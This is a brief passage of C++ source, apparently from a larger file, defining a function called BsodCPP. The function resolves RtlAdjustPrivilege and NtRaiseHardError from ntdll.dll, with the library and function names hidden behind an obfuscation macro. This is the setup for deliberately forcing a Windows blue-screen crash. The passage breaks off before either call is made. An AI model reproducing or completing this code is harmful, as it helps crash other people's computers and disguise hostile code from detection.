...
extern "C" void BsodCPP()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA(EX("ntdll.dll")), EX("RtlAdjustPrivilege"));
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA(EX("ntdll.dll")), EX("NtRaiseHardError"));
